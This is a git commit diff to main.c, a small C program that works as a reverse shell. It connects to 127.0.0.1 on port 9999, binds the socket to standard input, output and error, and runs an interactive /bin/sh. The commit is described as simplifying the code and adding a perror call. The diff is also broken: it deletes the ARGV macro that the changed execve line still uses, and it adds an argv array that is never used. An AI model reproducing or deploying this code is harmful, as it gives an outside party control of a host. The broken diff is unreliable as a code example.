bfc2b23cf9c60e2545d4c06e128d0b8c47361532
BluDay <19403893+BluDay@users.noreply.github.com>
2024-06-06 22:32:35 +0200

    feat: simplify code and add perror call

--- main.c
+++ main.c
@@ -7,13 +7,6 @@
 #include <sys/socket.h>
 #include <unistd.h>
 
-#define HOST "127.0.0.1"
-#define PORT 9999
-
-#define PROC "/bin/sh"
-
-#define ARGV { PROC, "-i" }
-
 void main(void)
 {
     struct sockaddr_in addr;
@@ -21,8 +14,8 @@ void main(void)
     int fd = socket(AF_INET, SOCK_STREAM, 0);
 
     addr.sin_family      = AF_INET;
-    addr.sin_addr.s_addr = inet_addr(HOST);
-    addr.sin_port        = htons(PORT);
+    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    addr.sin_port        = htons(9999);
 
     connect(fd, (struct sockaddr *)&addr, sizeof(addr));
 
@@ -30,5 +23,9 @@ void main(void)
     dup2(fd, STDOUT_FILENO);
     dup2(fd, STDERR_FILENO);
 
-    execve(PROC, (char * const [])ARGV, NULL);
+	char * const argv[] = { "/bin/sh", "-i", NULL };
+
+    execve("/bin/sh", (char * const [])ARGV, NULL);
+
+	perror("execve");
 }
